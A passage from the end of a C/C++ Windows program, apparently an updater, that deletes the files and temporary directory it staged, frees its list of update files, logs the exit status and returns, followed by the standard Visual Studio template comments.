				if (!DeleteFileW(filetodel) && GetLastError() != ERROR_FILE_NOT_FOUND)
					LogV("[CLEANUP] DeleteFileW failed: path=%ws, error=%lu\n",
						filetodel, GetLastError());
			}
			UpdateFilesListCurrent = UpdateFilesListCurrent->next;
		}
		if (!RemoveDirectoryW(dirtoclean) && GetLastError() != ERROR_PATH_NOT_FOUND)
			LogV("[CLEANUP] RemoveDirectoryW failed: path=%ws, error=%lu\n",
				dirtoclean, GetLastError());
	}
	while (UpdateFilesList)
	{
		UpdateFiles* next = UpdateFilesList->next;
		free(UpdateFilesList->filebuff);
		free(UpdateFilesList);
		UpdateFilesList = next;
	}

	if (processresult == 0)
		LogV("[EXIT] Returning process code 0\n");
	else
		LogE("[EXIT] Returning process code %d; final stage_index=%d, stage=%s, reason=%s, detail=0x%08lX",
			processresult, flowstageindex, flowstage, exitreason, exitdetail);

#undef FLOW_FAIL_WIN32
#undef FLOW_FAIL
#undef FLOW_STAGE
	return processresult;
}


// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
